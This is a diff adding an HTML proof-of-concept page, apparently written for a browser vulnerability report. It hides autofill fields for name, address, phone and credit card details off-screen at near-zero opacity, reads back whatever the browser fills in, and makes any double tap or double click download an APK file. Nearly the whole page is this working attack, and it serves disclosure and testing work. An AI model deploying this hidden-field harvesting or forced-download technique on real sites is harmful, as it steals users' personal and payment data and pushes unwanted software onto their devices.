@@ -1,0 +1,120 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; cursor: pointer; }
+
+input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
+#inputElem { cursor: pointer; }
+
+#output { padding: 0.2em; background: #eee; }
+#output.success { background: lightgreen; }
+
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+
+/* Red Button Styles */
+#redButton {
+  position: absolute;
+  top: 50%;
+  right: 40%;
+  width: 40px;
+  height: 40px;
+  background-color: red;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+<h1>PoC: Trigger APK download on double tap</h1>
+
+<!-- Red button -->
+<button id="redButton" title="Red Button"></button>
+
+<p id="output">(no output yet...)</p>
+
+<!-- Group 1 -->
+<input id="groupOneElem" name="name" autocomplete="name">
+<input name="email" autocomplete="email">
+<input name="address-line1" autocomplete="address-line1">
+<input name="address-line2" autocomplete="address-line2">
+<input name="city" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1">
+<input name="country-name" autocomplete="country-name">
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel">
+
+<!-- Group 2 -->
+<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
+<input name="cc-number" autocomplete="cc-number">
+<input name="cc-exp-month" autocomplete="cc-exp-month">
+<input name="cc-exp-year" autocomplete="cc-exp-year">
+
+<p id="instructions">Double tap anywhere to download testtesttest.apk</p>
+
+<script>
+var inputElem;
+var setMainField = () => {
+  if (window.location.search.indexOf('creditcard') === -1) {
+    var groupOneElem = document.getElementById('groupOneElem');
+    groupOneElem.id = 'inputElem';
+    inputElem = groupOneElem;
+  } else {
+    var groupTwoElem = document.getElementById('groupTwoElem');
+    groupTwoElem.id = 'inputElem';
+    inputElem = groupTwoElem;
+  }
+}
+
+setMainField();
+
+var updateOutput = () => {
+    var inputs = document.querySelectorAll('input');
+    var inputValues = [];
+    inputs.forEach((elem) => {
+       if (elem.value.length) {
+         inputValues.push(elem.value);
+       }
+    });
+    output.innerText = inputValues.join(', ');
+    output.classList.add('success');
+}
+
+inputElem.addEventListener('change', (e) => {
+  if (inputElem.value.length > 0) {
+    setTimeout(() => { updateOutput(); }, 10);
+  }
+});
+
+// Trigger APK download
+function downloadApk() {
+  const apkLink = document.createElement('a');
+  apkLink.href = 'testtesttest.apk'; // Make sure this file is hosted and accessible
+  apkLink.download = 'testtesttest.apk';
+  document.body.appendChild(apkLink);
+  apkLink.click();
+  document.body.removeChild(apkLink);
+
+  document.getElementById('output').innerText = "📦 Downloading testtesttest.apk...";
+}
+
+let lastTap = 0;
+
+window.addEventListener('touchstart', (e) => {
+  const currentTime = new Date().getTime();
+  const tapLength = currentTime - lastTap;
+  if (tapLength < 300 && tapLength > 0) {
+    downloadApk();
+  }
+  lastTap = currentTime;
+});
+
+window.addEventListener('dblclick', (e) => {
+  downloadApk();
+});
+</script>
+
+</body>
+</html>
